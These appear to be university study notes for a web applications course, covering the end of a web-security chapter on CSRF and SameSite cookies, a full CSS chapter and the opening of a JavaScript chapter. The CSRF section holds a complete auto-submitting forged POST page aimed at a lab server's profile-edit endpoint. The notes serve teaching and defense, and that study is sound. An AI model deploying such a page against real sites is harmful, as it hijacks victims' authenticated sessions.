![[websec-csrf-schema2.jpg|500]]
*Figure 10: Malicious page that makes the browser send cross-site requests*

Attacker creates a malicious page that automatically triggers cross-site requests to Website A and/or Website B. The browser attaches the victim's cookies → server accepts as authenticated request.

### CSRF Example Code

![[websec-csrf-example.jpg|500]]
*Figure 11: Example of a forged POST request in a CSRF attack*

> [!Example] CSRF Forged POST Request
> **Contesto:** Attacker's page automatically submits a profile-edit form to the victim's social network.
> **Codice:**
> ```html
> <html>
> <body>
> <h1>This page forges an HTTP POST request.</h1>
> <script type="text/javascript">
>     function forge_post() {
>         var fields;
>         // Hidden form fields — victim won't see them
>         fields += "<input type='hidden' name='name' value='Alice'>";
>         fields += "<input type='hidden' name='briefdescription' value='Samy is my Hero'>";
>         fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
>         fields += "<input type='hidden' name='guid' value='56'>";
>
>         // Create <form> element
>         var p = document.createElement("form");
>         // Construct the form
>         p.action = "http://www.seed-server.com/action/profile/edit";
>         p.innerHTML = fields;
>         p.method = "post";
>         // Append the form to the current page
>         document.body.appendChild(p);
>         // Submit the form
>         p.submit();
>     }
>
>     // Invoke forge_post() after the page is loaded
>     window.onload = function() { forge_post(); }
> </script>
> </body>
> </html>
> ```
> **Spiegazione:** As soon as the victim loads the attacker's page, `forge_post()` fires, constructs a hidden form targeting the victim's social network, and submits it. The browser attaches the victim's session cookie → server processes it as a legitimate profile edit.

### Protection: SameSite Cookie

> [!Important] SameSite Cookie Attribute
> The `SameSite` attribute on cookies controls whether cookies are sent with **cross-site requests**.
>
> The attribute is set by the **server**. Cookies with `SameSite` are always sent with same-site requests; whether they are sent with cross-site requests depends on the attribute value.
>
> | Value | Behavior |
> |-------|----------|
> | `Strict` | Cookie **not sent** with any cross-site request |
> | `Lax` | Cookie sent with cross-site requests |
>
> **Intuition:** `SameSite=Strict` breaks CSRF completely — the forged POST request arrives without the victim's session cookie, so the server rejects it as unauthenticated.
>
> Supported in Chrome, Opera, and modern browsers.

---

## Summary Table

| Attack | Target | Mechanism | Root Cause | Primary Defense |
|--------|--------|-----------|-----------|----------------|
| **SQL Injection** | Database | Inject SQL into query string | Mixing user input with SQL code | Prepared statements; input encoding |
| **Stored XSS** | Other users' browsers | Store `<script>` in DB; execute on retrieval | Unsanitized user input rendered as HTML | Output encoding; DOMPurify |
| **Reflected XSS** | Individual user via crafted URL | Malicious URL parameter reflected in response | Server echoes unescaped input | Output encoding; input validation |
| **DOM-Based XSS** | User's browser | Client-side JS inserts attacker data into DOM | Unsafe `innerHTML`/`document.write` | Avoid dangerous DOM APIs; sanitize |
| **CSRF** | Authenticated session | Forged cross-site request with victim's cookies | Server trusts cookies from cross-site requests | `SameSite=Strict` cookie |

| Defense | Protects Against | How |
|---------|-----------------|-----|
| **Prepared statements** | SQL Injection | Separate code and data; placeholders |
| **Input encoding/filtering** | SQL Injection, XSS | Escape special chars before use |
| **Output encoding** | XSS | HTML-encode before rendering |
| **DOMPurify / HTML sanitization** | XSS | Strip dangerous tags/attributes |
| **`SameSite=Strict` cookie** | CSRF | Block cookies on cross-site requests |
| **Modern frameworks** | XSS | Built-in escaping (React, Angular, Vue) |

## Questions

1. How do confidentiality, integrity, and availability define the main security goals of a web application?
2. Why must an attacker understand the application's components and expected user interactions before exploiting it?
3. What is the purpose of the OWASP Top Ten, and why do categories such as injection and broken access control remain important?
4. In the attack scenario diagram, why does giving the attacker normal HTTP access create risk when input handling is weak?
5. What is the root cause of SQL injection, and why does mixing untrusted user data with trusted SQL code confuse the database parser?
6. How do characters such as `'`, `;`, `--`, and comments help attackers alter SQL query structure?
7. How does the xkcd `Robert'); DROP TABLE Students;--` example show the danger of mixing user data with SQL code?
8. Why do prepared statements prevent SQL injection more reliably than manual string filtering alone?
9. How is XSS similar to SQL injection conceptually, and how is the target of the injected code different?
10. How do stored, reflected, and DOM-based XSS differ in where the malicious script is stored or reflected?
11. In the stored XSS flow, where should validation, sanitization, or encoding be applied to prevent the browser from executing attacker-controlled script?
12. How does the Samy Worm style example use a victim's browser privileges and session tokens against a trusted site?
13. Why is output encoding different from input validation, and why are both relevant for XSS defense?
14. How does CSRF exploit the browser's automatic cookie sending behavior for cross-site requests?
15. How does `SameSite=Strict` change browser cookie behavior, and why does that help block forged POST requests?
16. How would you combine prepared statements, output encoding, DOM sanitization, and SameSite cookies into a defense-in-depth strategy?

# CSS — Web Applications 2025-26

## Table of Contents

- [[#Introduction|Introduction]]
  - [[#History|History]]
  - [[#How CSS Works|How CSS Works]]
  - [[#Benefits and CSS Recipe|Benefits and CSS Recipe]]
- [[#Attaching CSS to HTML|Attaching CSS to HTML]]
  - [[#External Style Sheets|External Style Sheets]]
  - [[#Embedded Style Sheets|Embedded Style Sheets]]
  - [[#Inline Styles|Inline Styles]]
  - [[#Multiple Style Sheets|Multiple Style Sheets]]
- [[#CSS Rules|CSS Rules]]
  - [[#Anatomy of a Rule|Anatomy of a Rule]]
  - [[#Selectors|Selectors]]
  - [[#Pseudo-Class Selectors|Pseudo-Class Selectors]]
- [[#The Cascade|The Cascade]]
  - [[#Cascade Rules|Cascade Rules]]
  - [[#Style Sheet Hierarchy|Style Sheet Hierarchy]]
  - [[#Inheritance|Inheritance]]
- [[#Colors|Colors]]
- [[#Text and Typefaces|Text and Typefaces]]
- [[#The Box Model|The Box Model]]
  - [[#Box Dimensions|Box Dimensions]]
  - [[#Overflow|Overflow]]
  - [[#Padding|Padding]]
  - [[#Borders|Borders]]
  - [[#Margin|Margin]]
- [[#Display and Visibility|Display and Visibility]]
- [[#Positioning|Positioning]]
  - [[#Normal Flow|Normal Flow]]
  - [[#Relative Positioning|Relative Positioning]]
  - [[#Absolute Positioning|Absolute Positioning]]
  - [[#Fixed Positioning|Fixed Positioning]]
- [[#Float|Float]]
- [[#Layout|Layout]]
  - [[#Fixed vs Liquid Layouts|Fixed vs Liquid Layouts]]
  - [[#Flexbox|Flexbox]]
  - [[#Grid|Grid]]
- [[#Responsive Web Design|Responsive Web Design]]
  - [[#Viewport|Viewport]]
  - [[#Media Queries|Media Queries]]
  - [[#Breakpoints|Breakpoints]]
  - [[#Take Away and Further Reading|Take Away and Further Reading]]
- [[#Summary Table|Summary Table]]

---

## Introduction

**CSS** (*Cascading Style Sheets*) is the W3C standard for defining the **presentation** of HTML/XML documents — separating content structure from visual appearance.

### History

| Year | Milestone |
|------|-----------|
| 1994 | CSS proposed by Håkon Wium Lie |
| 1996 | CSS1 released as W3C Recommendation |
| 1998 | CSS2 |
| 1999 | CSS3 (modular; still evolving) |

### How CSS Works

Browser builds a **DOM tree** from HTML, then applies CSS rules to each node. Resulting styled tree is rendered on screen.

![[css-html-tree.jpg|580]]
*Figure 1: HTML tree used to explain CSS selectors and rules*

### Benefits and CSS Recipe

CSS gives:

- **Precise type and layout controls** — CSS can achieve print-like precision
- **Less work** — changing one stylesheet can change the appearance of an entire site
- **Reliable browser support** — every browser in current use supports CSS

Example from the slides: `http://www.csszengarden.com/`, where the same HTML can be presented through different CSS designs.

> [!Important] CSS Recipe
> 1. Start with a document marked up in HTML.
> 2. Write style rules for how selected elements should look.
> 3. Attach the style rules to the document.
>
> When the browser displays the document, it follows those rules for rendering elements.

---

## Attaching CSS to HTML

Three methods, from most to least recommended:

### External Style Sheets

Separate `.css` file linked from `<head>`:

```html
<link rel="stylesheet" type="text/css" href="styles.css" />
```

`<link>` is an empty element inside `<head>` and uses:

| Attribute | Meaning |
|-----------|---------|
| `href` | Path to the CSS file, often in a `css/` or `styles/` folder |
| `type` | Type of linked document; for CSS, `text/css` |
| `rel` | Relationship with the HTML page; for CSS, `stylesheet` |

Or imported inside another stylesheet:

```css
@import url("styles.css");
```

**Advantages:** single file controls multiple pages; browser caches it; complete separation of content and presentation.

### Embedded Style Sheets

`<style>` block inside `<head>`:

```html
<style type="text/css">
  body { font-family: Arial; }
  h1   { color: navy; }
</style>
```

Applies to the single HTML document only.

### Inline Styles

`style` attribute on individual element:

```html
<p style="color: red; font-size: 14px;">Text</p>
```

Highest specificity; hardest to maintain; avoid except for dynamic overrides.

### Multiple Style Sheets

Large sites often split CSS by concern: typography, layout, forms, tables, or site subsections.

Two ways to attach multiple stylesheets:

1. Link one main stylesheet from HTML and use `@import` inside it:

```css
@import url("tables.css");
@import url("typography.css");
```

2. Add multiple `<link>` elements in the HTML:

```html
<link rel="stylesheet" type="text/css" href="css/site.css" />
<link rel="stylesheet" type="text/css" href="css/tables.css" />
<link rel="stylesheet" type="text/css" href="css/typography.css" />
```

---

## CSS Rules

### Anatomy of a Rule

```css
selector { property: value; }
```

- **Selector** — targets the HTML element(s) to style
- **Declaration** — `property: value;` pair inside `{}`
- **Declaration block** — one or more declarations inside `{}`

Multiple declarations per rule:

```css
h1 {
    font-size: 24px;
    color: navy;
    font-weight: bold;
}
```

### Selectors

![[css-selectors-1.jpg|560]]
*Figure 2: Examples of CSS selectors for elements, ids, and classes*

![[css-selectors-2.jpg|560]]
*Figure 3: Examples of CSS selectors with combinators and element relationships*

![[css-selectors-3.jpg|560]]
*Figure 4: Examples of advanced CSS selectors and pseudo-classes*

| Selector | Syntax | Meaning |
|----------|--------|---------|
| **Universal** | `* {}` | All elements |
| **Type** | `h1, h2, h3 {}` | All matching element names |
| **Class** | `.note {}` / `p.note {}` | Elements with matching `class` attribute |
| **ID** | `#intro {}` | Element with matching `id` attribute |
| **Child** | `li>a {}` | Direct children only |
| **Descendant** | `p a {}` | Any descendant, not just direct children |
| **Adjacent Sibling** | `h1+p {}` | First sibling immediately after `h1` |
| **General Sibling** | `h1~p {}` | All `p` siblings after `h1` |

CSS selectors are **case-sensitive**.

Group selectors avoid repeating the same declaration block:

```css
h1, h2, p, em, img {
    border: 1px solid blue;
}
```

### Pseudo-Class Selectors

Apply based on element **state**, not structure:

| Pseudo-class | Applies when |
|-------------|-------------|
| `:link` | Unvisited link |
| `:visited` | Already-clicked link |
| `:focus` | Element has keyboard focus |
| `:hover` | Mouse over element |
| `:active` | Element being activated (clicked) |

> [!Important] LVFHA Order
> Declare link pseudo-classes in this order: `:link` → `:visited` → `:focus` → `:hover` → `:active`.
> Later rules override earlier ones; wrong order breaks hover/active.
> **Mnemonic:** *LoVe Fears HAte*

---

## The Cascade

### Cascade Rules

When two rules have equal specificity, **last rule wins**. `!important` overrides all other declarations.

**Specificity calculation** (higher = wins):
1. Inline styles — highest
2. ID selectors (`#id`) — 100
3. Class/pseudo-class/attribute selectors — 10
4. Type selectors (`h1`) — 1
5. Universal selector — 0

```css
/* specificity 0,0,1,1 */
h1.header { color: red; }

/* specificity 0,1,0,0 — wins */
#main { color: blue; }
```

### Style Sheet Hierarchy

Ordered from **lowest** to **highest** precedence:

1. Browser defaults
2. User settings
3. External style sheet (via `<link>`)
4. `@import` inside external stylesheet
5. Embedded (`<style>` in `<head>`)
6. Inline (`style="..."` attribute)
7. `!important` author rule
8. `!important` user rule — **highest**

> [!Important] Cascade Priority
> Specificity beats source order; `!important` beats specificity; user `!important` beats author `!important`.
> **Intuition:** browser defaults lose to everything; user's accessibility overrides win over everything.

### Inheritance

Text-related properties **do inherit** (pass from parent to children):
- `font-size`, `font-family`, `color`, `line-height`, `text-align`

Box-related properties **do not inherit**:
- `border`, `margin`, `padding`, `background-color`, `width`, `height`

Force inheritance with `inherit` keyword:

```css
.child { border: inherit; }
```

---

## Colors

| Notation | Syntax | Example |
|----------|--------|---------|
| **Color name** | keyword | `color: red;` |
| **RGB** | `rgb(r, g, b)` — 0–255 | `rgb(255, 0, 128)` |
| **HEX** | `#rrggbb` | `#ff0080` |
| **HSL** | `hsl(hue°, sat%, lightness%)` | `hsl(300, 100%, 50%)` |
| **RGBA** | adds alpha 0.0–1.0 | `rgba(255, 0, 0, 0.5)` |
| **HSLA** | adds alpha | `hsla(300, 100%, 50%, 0.5)` |
| **Opacity** | `opacity: 0.0–1.0` | `opacity: 0.75;` |

`opacity` affects the **entire element** including children; `rgba`/`hsla` affect only the specific property.

- `color` sets the **foreground text color**.
- `background-color` sets the color of the element box background.
- If no background color is specified, the background is transparent; browser windows are white by default in most browsers.

RGB is an **additive** color model: red, green, and blue light are combined to represent colors on electronic displays. Each CSS `rgb(red, green, blue)` channel ranges from `0` to `255`.

HSL represents color through:

| Component | Meaning |
|-----------|---------|
| Hue | The color, represented as an angle on a color circle |
| Saturation | Amount of gray in the color; `100%` means no gray, `0%` tends toward gray |
| Lightness | Amount of white or black; `100%` is white, `0%` is black, `50%` is normal |

> [!Important] Contrast
> Foreground and background colors need enough contrast for text to be legible. Very low contrast makes text hard to read; for long passages, extremely high contrast can also be tiring, so slightly reduced contrast can improve readability.

Useful color links from the slides:

- `http://hslpicker.com/`
- `http://colorbrewer2.org/`
- `https://coolors.co/`
- `https://www.w3schools.com/colors/colors_theory.asp`

---

## Text and Typefaces

### Font Families

Generic families (browser fallbacks):
- `serif` — letters have extra details at stroke ends; traditionally used for long passages in print
- `sans-serif` — cleaner straight stroke ends; often clearer on low-resolution screens, especially at small sizes
- `monospace` — every letter has the same width; commonly used for code because columns align
- `cursive` — handwriting-like joining strokes or cursive characteristics
- `fantasy` — decorative fonts, usually for titles rather than long body text

**Font stack** — ordered list with generic fallback:

```css
body {
    font-family: Georgia, "Times New Roman", serif;
}
```

Best practice: ≤ 3 typefaces; multi-word names in quotes; end with generic family.

### Font Size

```css
p { font-size: 16px; }   /* absolute pixels */
h1 { font-size: 150%; }  /* relative to parent */
```

Default browser font size: **16px**. `%` is relative to parent element's font-size.

### Other Text Properties

```css
font-weight: bold | normal | 100–900;
font-style:  italic | normal | oblique;
text-align:  left | right | center | justify;
text-decoration: none | underline | overline | line-through;
letter-spacing: 2px;
line-height: 1.5;   /* unitless = relative to font-size */
```

---

## The Box Model

Every HTML element is a rectangular **box** with four areas, from inside out:

1. **Content area** — where text/images render
2. **Padding** — transparent space between content and border
3. **Border** — line around padding+content
4. **Margin** — transparent space outside border (between boxes)

![[css-box-model.jpg|520]]
*Figure 5: CSS box model with content, padding, border, and margin*

**Total occupied width:**
```
left-margin + left-border + left-padding + width
+ right-padding + right-border + right-margin
```

> [!Important] Box Model Width Formula
> `width` property = content width only (not including padding/border/margin).
> In the slide example, `width: 500px`, `padding: 20px`, `border: 2px`, and `margin: 20px` produce:
>
> `20px + 2px + 20px + 500px + 20px + 2px + 20px = 584px`
>
> The total visible box without margins is `544px`.
> **Intuition:** adding padding, border, or margin makes the total occupied area larger than the declared content `width`.

### Box Dimensions

| Unit | Meaning |
|------|---------|
| `px` | Fixed pixel size |
| `%` | Percentage of containing element |
| `em` | Relative to current font-size |

### Overflow

Controls behavior when content exceeds box dimensions:

| Value | Behavior |
|-------|----------|
| `visible` (default) | Content overflows outside box |
| `hidden` | Overflow clipped, invisible |
| `scroll` | Scrollbars always shown |
| `auto` | Scrollbars only when needed |

### Padding

```css
/* individual sides */
padding-top: 10px;
padding-right: 20px;
padding-bottom: 10px;
padding-left: 20px;

/* shorthand — TRouBLe: top right bottom left */
padding: 10px 20px 10px 20px;

/* 2 values: top-bottom  left-right */
padding: 10px 20px;

/* 1 value: all sides */
padding: 10px;
```

Padding **not inherited**. Adds to the total space occupied by the element.

### Borders

```css
border-width: thin | medium | thick | px;
border-style: solid | dotted | dashed | double | groove | ridge | inset | outset | hidden | none;
border-color: #333;

/* shorthand */
border: 3px solid #333;

/* individual sides */
border-top: 2px dashed red;
```

> [!Warning] Border requires style
> Border **must** have `border-style` declared — without it, border does not render even if `border-width` and `border-color` are set.

Decorative extensions:

```css
border-radius: 5px;              /* rounded corners */
border-radius: 50%;              /* circle (on square element) */
border-radius: 10px 20px;        /* elliptical: horizontal vertical */
box-shadow: 3px 3px 6px rgba(0,0,0,0.3);   /* h-offset v-offset blur color */
```

### Margin

Same shorthand as padding (TRouBLe). Not inherited. Adds spacing **outside** box — does not affect box's `width`/`height` but affects total space occupied in layout.

```css
margin: 20px auto;   /* top-bottom: 20px; left-right: auto → center block element */
```

---

## Display and Visibility

| `display` value | Behavior |
|-----------------|----------|
| `block` | Starts on new line; takes full available width; can set width/height |
| `inline` | Does not start new line; only as wide as content; width/height ignored |
| `list-item` | Displays an element as a list item |
| table display values | Display an element as a table, row, or cell |
| `none` | **Removes element from layout entirely** — no space reserved |

`visibility: hidden` — element invisible but **space preserved** in layout.

> [!Important] display:none vs visibility:hidden
> `display: none` collapses the space; `visibility: hidden` hides but keeps space.
> **Intuition:** `display:none` is like deleting from layout; `visibility:hidden` is like painting it white.

The W3C discourages random reassignment of display roles. A common controlled use is making list items inline for a horizontal navigation menu:

```css
li {
    display: inline;
}
```

---

## Positioning

### Normal Flow

`position: static` (default). Block elements stack top-to-bottom; inline elements flow left-to-right within lines.

### Relative Positioning

```css
.element {
    position: relative;
    top: 20px;
    left: 30px;
}
```

Moves relative to its **normal flow position**. Original space **preserved** in layout (gap left behind).

### Absolute Positioning

```css
div.relative {
    position: relative;
}
div.absolute {
    position: absolute;
    top: 90px;
    left: 100px;
    width: 200px;
    height: 100px;
}
```

Element **removed from normal flow** — no gap. Positioned relative to **nearest ancestor with `position` ≠ `static`** (or `<body>` if none).

> [!Example] Relative container + absolute child
> **Contesto:** Common pattern for overlays/tooltips.
> **Codice:**
> ```html
> <div class="relative">Parent (position: relative)
>   <div class="absolute">Child (position: absolute)</div>
> </div>
> ```
> **Spiegazione:** Child positions relative to parent because parent is the nearest non-static ancestor.

### Fixed Positioning

```css
.fixed-header {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
}
```

Removed from flow. Positioned relative to **viewport** (browser window). Stays in place during scroll. Classic use: sticky navigation bars, cookie banners.

---

## Float

```css
img { float: left; }
img { float: right; }
```

Floated element moves to left or right of container; **surrounding content wraps around it**. Must specify `width` on block elements.

Key behaviors from the slides:

- A floated element is outside normal flow, but following content flows around it
- A float stays inside the **content area** of its containing element; it does not extend into the padding area
- Margins are maintained on all sides, so the whole element box floats from outer edge to outer edge
- A floated block does not float higher than its reference point in the source; it stays below preceding block elements

`clear` property stops wrap-around:

```css
.after-float { clear: left | right | both | none; }
```

> [!Example] Float + clear
> **Codice:**
> ```css
> .div1 { float: left; width: 100px; height: 50px; }
> .div2 { border: 1px solid red; }          /* wraps around .div1 */
> .div3 { float: left; width: 100px; }
> .div4 { border: 1px solid red; clear: left; } /* breaks below floats */
> ```

> [!Warning] Parent collapse with floats
> If all children are floated, parent element collapses to 0 height.
> **Fix:**
> ```css
> .parent { overflow: auto; width: 100%; }
> ```

---

## Layout

### Fixed vs Liquid Layouts

| | Fixed | Liquid |
|--|-------|--------|
| Unit | `px` | `%` |
| Precise control | Yes | No |
| Adapts to screen | No | Yes |
| Risk | Large gaps on big screens | Uncontrolled line lengths |

### Flexbox

**1D layout** (single row or column). Apply `display: flex` on container.

```css
.container {
    display: flex;
    flex-direction: row | column | row-reverse | column-reverse;
    flex-wrap: nowrap | wrap | wrap-reverse;
    justify-content: flex-start | flex-end | center | space-between | space-around;
    align-items: stretch | flex-start | flex-end | center | baseline;
    align-content: flex-start | flex-end | center | space-between | stretch;
}
```

**Flex items** (children):

```css
.item {
    order: 0;           /* display order, default 0 */
    flex-grow: 1;       /* proportion of extra space to take */
    flex-shrink: 1;     /* proportion to shrink when needed */
    flex-basis: auto;   /* initial size before distribution */
    flex: 1 1 auto;     /* shorthand: grow shrink basis */
    align-self: auto;   /* override container's align-items */
}
```

> [!Important] Flexbox axis
> `flex-direction` sets the **main axis**; `justify-content` aligns on main axis; `align-items` aligns on cross axis.
> **Intuition:** think of flex-direction as setting the "track" — justification runs along the track, alignment runs perpendicular.

### Grid

**2D layout** (rows and columns simultaneously).

```css
.grid-container {
    display: grid;
    grid-template-columns: 1fr 2fr auto;
    grid-template-rows: 2fr 1fr;
}

p {
    width: 230px;
    margin: 5px;
    padding: 5px;
    background-color: #efefef;
}
```

![[css-grid-layout.jpg|560]]
*Figure 6: CSS Grid layout example with rows, columns, and fr units*

**`fr` unit** = *fractional unit* — divides available space proportionally.

```css
/* 3 equal columns */
grid-template-columns: 1fr 1fr 1fr;

/* equivalent */
grid-template-columns: repeat(3, 1fr);
```

> [!Important] Grid vs Flexbox
> - **Flexbox**: 1D, content-driven. Use for nav bars, card rows, toolbars.
> - **Grid**: 2D, layout-driven. Use for page-level structure, complex alignment.
> - Can **combine**: grid for outer layout, flex for items within cells.

---

## Responsive Web Design

### History

Web design evolution:
1. Desktop-only fixed layouts
2. Fluid/liquid layouts (% widths)
3. Mobile-specific subdomains (`m.site.com`) — separate codebase
4. **Responsive Web Design** (RWD) — single codebase adapts to all viewports

**Progressive enhancement**: design for lowest capability first, then enhance. Mobile-first design: start with mobile CSS, add complexity for larger screens.

Why responsive design:

- Users get the right layout on each device instead of seeing a mobile site on desktop or a desktop site on mobile
- Less work: one website, one design, one codebase, one content set
- Better for search: separate mobile URLs can create search placement issues

Media queries rearrange layout, but responsive design also needs flexible horizontal measurements: use `em` or `%` rather than fixed pixels where the layout must adapt.

### Viewport

Without viewport meta tag, mobile browsers render at desktop width (~980px) then scale down.

```html
<meta name="viewport" content="width=device-width, initial-scale=1">
```

- `width=device-width` — viewport = actual device CSS pixels
- `initial-scale=1` — 1:1 zoom ratio

### Media Queries

Apply different CSS based on device/viewport characteristics.

```css
@media only screen and (min-width: 40em) {
    /* CSS applied when screen >= 40em wide */
    body { font-size: 18px; }
}
```

**Structure:**

```
@media  [not|only]  mediatype  [and (mediafeature)]  { CSS }
```

**Keywords:**
- `only` — blocks old browsers that don't support media queries (ignored by modern browsers)
- `not` — inverts entire query
- `and` — combines type and feature conditions

**Media types:**

| Type | Targets |
|------|---------|
| `all` | All devices |
| `screen` | Screens (monitors, phones, tablets) |
| `print` | Print preview / printed pages |
| `speech` | Screen readers |

**Media features:**

| Feature | Example |
|---------|---------|
| `width` | `(width: 600px)` |
| `min-width` | `(min-width: 40em)` |
| `max-width` | `(max-width: 1200px)` |
| `height`, `min-height`, `max-height` | viewport height |
| `orientation` | `(orientation: landscape)` |
| `aspect-ratio` | `(aspect-ratio: 16/9)` |
| `resolution` | `(min-resolution: 300dpi)` |

**Three ways to use media queries:**

1. Inside stylesheet:
```css
@media screen and (min-width: 40em) { ... }
```

2. `media` attribute on `<link>`:
```html
<link rel="stylesheet" media="screen and (min-width: 40em)" href="wide.css">
```

3. `media` attribute on `<style>`:
```html
<style media="screen and (min-width: 40em)"> ... </style>
```

> [!Example] Media query in stylesheet
> **Contesto:** Mobile-first responsive layout.
> **Codice:**
> ```css
> /* Base: mobile */
> .container { width: 100%; }
> nav { display: none; }
>
> /* Tablet (≥ 40em) */
> @media only screen and (min-width: 40em) {
>     .container { width: 80%; margin: 0 auto; }
>     nav { display: block; }
> }
>
> /* Desktop (≥ 64em) */
> @media only screen and (min-width: 64em) {
>     .container { width: 960px; }
> }
> ```
> **Spiegazione:** Mobile styles as default; media queries add complexity progressively.

### Breakpoints

**Breakpoint** = viewport width at which layout changes via media query.

**Design range** = range of screen sizes that share one variation of the design.

Design principle: breakpoints should be determined by **content**, not device sizes. Layout should look good at *any* width — a breakpoint is needed when the design starts to break, not when a specific device appears.

**Mobile-first** is easier: start with simple single-column layout, progressively add columns/features at wider breakpoints.

### Take Away and Further Reading

> [!Important] Take Away
> - Keep structure and presentation separate.
> - CSS gives powerful control over presentation.
> - Cascading and inheritance rules determine which styles actually apply.

Further readings from the slides:

- Hart-Davis, G. (2023). *Teach Yourself VISUALLY HTML and CSS*, 2nd edition. John Wiley & Sons.
- Duckett, J. (2011). *HTML and CSS: Design and Build Websites*. John Wiley & Sons.
- Frain, B. (2012). *Responsive Web Design with HTML5 and CSS3*. Packt Publishing Ltd.
- Peterson, C. (2014). *Learning Responsive Web Design: a Beginner's Guide*. O'Reilly Media.
- Robbins, J. N. (2012). *Learning Web Design: A Beginner's Guide to HTML, CSS, JavaScript, and Web Graphics*. O'Reilly Media.

---

## Summary Table

| Concept | Property/Syntax | Key Notes |
|---------|----------------|-----------|
| **External stylesheet** | `<link rel="stylesheet" href="...">` | Recommended; cacheable |
| **Type selector** | `h1 {}` | Matches all elements of that type |
| **Class selector** | `.name {}` | Reusable; multiple per element |
| **ID selector** | `#name {}` | Unique per page; high specificity |
| **Descendant** | `p a {}` | Any depth; not just direct children |
| **Child** | `li>a {}` | Direct children only |
| **Sibling** | `h1+p {}` / `h1~p {}` | Adjacent / general |
| **Cascade** | specificity > last-rule > `!important` | User `!important` beats author |
| **Inheritance** | text props yes; box props no | Force with `inherit` |
| **Colors** | `rgb()`, `#hex`, `hsl()`, `rgba()`, `hsla()` | Contrast matters; RGBA/HSLA add transparency |
| **Box model** | content + padding + border + margin | Declared `width`/`height` apply to content box |
| **Overflow** | `visible/hidden/scroll/auto` | `hidden` clips; `auto` adds scrollbar when needed |
| **display: none** | removes from flow | vs `visibility: hidden` keeps space |
| **position: relative** | offset from normal pos | space preserved |
| **position: absolute** | relative to nearest non-static ancestor | removed from flow |
| **position: fixed** | relative to viewport | stays during scroll |
| **float** | `float: left/right` | use `clear` to stop wrap |
| **Flexbox** | `display: flex` | 1D layout; row or column |
| **Grid** | `display: grid` | 2D layout; `fr` unit |
| **Viewport meta** | `width=device-width, initial-scale=1` | Required for mobile |
| **Media query** | `@media only screen and (min-width: 40em)` | Works with flexible units and design ranges |

## Questions

1. How does CSS separate document structure from presentation, and why is this separation important for maintainability?
2. How does the browser use the DOM tree when applying CSS rules to an HTML document?
3. What are the tradeoffs between external, embedded, and inline CSS, and why are external stylesheets usually preferred?
4. How do selectors such as type, class, ID, child, descendant, adjacent sibling, and general sibling target different parts of the document?
5. Why must link pseudo-classes be declared in LVFHA order, and what can break if the order is wrong?
6. How do specificity, source order, and `!important` interact in the cascade?
7. Why do user `!important` rules outrank author rules, and how does this support accessibility?
8. Which CSS properties are inherited by default, which are not, and why does this distinction matter?
9. How do `rgb`, `hex`, `hsl`, `rgba`, `hsla`, and `opacity` differ, especially for transparency?
10. In the box model diagram, how do content, padding, border, and margin combine to determine the total space an element occupies?
11. Why does the declared `width` not equal the total occupied width of an element in the standard CSS box model?
12. How do `display: none` and `visibility: hidden` differ in their effect on layout?
13. How do static, relative, absolute, and fixed positioning change an element's relationship to normal flow and its containing block?
14. What problems can floats cause, and how do `clear` or the `overflow: auto; width: 100%;` parent fix address them?
15. When would you choose Flexbox, Grid, or a combination of both for page layout?
16. Why does responsive design require the viewport meta tag, media queries, and content-driven breakpoints?
17. How does a mobile-first approach change the structure of CSS compared with starting from a desktop layout?

# JavaScript — Web Applications 2025-26

## Table of Contents

- [[#Introduction to JavaScript|Introduction to JavaScript]]
  - [[#What is JavaScript?|What is JavaScript?]]
  - [[#JavaScript vs Java|JavaScript vs Java]]
  - [[#What JavaScript Can and Cannot Do|What JavaScript Can and Cannot Do]]
  - [[#Adding JavaScript to a Page|Adding JavaScript to a Page]]
  - [[#Script Execution and Placement|Script Execution and Placement]]
- [[#JavaScript Syntax|JavaScript Syntax]]
  - [[#Case Sensitivity and Comments|Case Sensitivity and Comments]]
  - [[#Semicolons|Semicolons]]
  - [[#Data Types|Data Types]]
  - [[#Variables|Variables]]
  - [[#Numbers|Numbers]]
  - [[#Strings|Strings]]
  - [[#Booleans|Booleans]]
  - [[#Null and Undefined|Null and Undefined]]
  - [[#Statements|Statements]]
- [[#JavaScript Objects|JavaScript Objects]]
  - [[#Object Literals|Object Literals]]
  - [[#Constructor Functions|Constructor Functions]]
  - [[#this Keyword|this Keyword]]
  - [[#Deleting Properties|Deleting Properties]]
- [[#Arrays|Arrays]]
  - [[#Creating and Accessing Arrays|Creating and Accessing Arrays]]
  - [[#Array Methods|Array Methods]]
  - [[#forEach|forEach]]
- [[#Functions|Functions]]
- [[#Browser Objects|Browser Objects]]
  - [[#The Window Object|The Window Object]]
  - [[#Dialog Boxes|Dialog Boxes]]
  - [[#Timers|Timers]]
  - [[#Navigator and Screen|Navigator and Screen]]
  - [[#The Console Object|The Console Object]]
  - [[#Browser Developer Tools|Browser Developer Tools]]
- [[#The Document Object Model (DOM)|The Document Object Model (DOM)]]
  - [[#DOM Structure|DOM Structure]]
  - [[#Node Properties|Node Properties]]
  - [[#Selecting Elements|Selecting Elements]]
  - [[#Element Properties and Attributes|Element Properties and Attributes]]
  - [[#Manipulating the DOM|Manipulating the DOM]]
- [[#Handling Events|Handling Events]]
  - [[#JavaScript Timeline|JavaScript Timeline]]
  - [[#Events, Types, Targets|Events, Types, Targets]]
  - [[#Event Handlers and Objects|Event Handlers and Objects]]
  - [[#Mouse Events|Mouse Events]]
  - [[#Key Events|Key Events]]
  - [[#Form Events|Form Events]]
  - [[#Window Events|Window Events]]
  - [[#Registering Event Handlers|Registering Event Handlers]]
- [[#Summary Table|Summary Table]]

---

## Introduction to JavaScript

### What is JavaScript?

> [!Important] JavaScript — Role in the Web Stack
> Three technologies define a web page:
> - **HTML** — structure
> - **CSS** — presentation
> - **JavaScript** — behavior / interactivity
>
> JavaScript is a **high-level, dynamically typed, interpreted** language suited to object-oriented and functional styles.
> Traditionally **client-side** (runs on user's machine in browser); increasingly also **server-side** via *Node.js*.
>
> **Intuition:** HTML builds the skeleton, CSS paints it, JavaScript makes it move and respond.

### JavaScript vs Java

- Chris Heilmann's quote from the slides: "Java is to JavaScript what Car is to Carpet."
- Name is misleading — JavaScript and Java share only superficial syntactic similarity
- Created by **Brendan Eich** at Netscape in **1995**, originally named *LiveScript*, renamed to JavaScript for marketing reasons
- Completely different type system, object model, and runtime
- JavaScript also had a bad reputation for a period because it was associated with unwanted redirects, pop-up windows, and security vulnerabilities

### What JavaScript Can and Cannot Do

**Can:**
- Access/modify any element, attribute, or text in the HTML page
- React to events (clicks, key presses, page load)
- Form validation, slideshows, partial page reload (AJAX), filtering, device detection

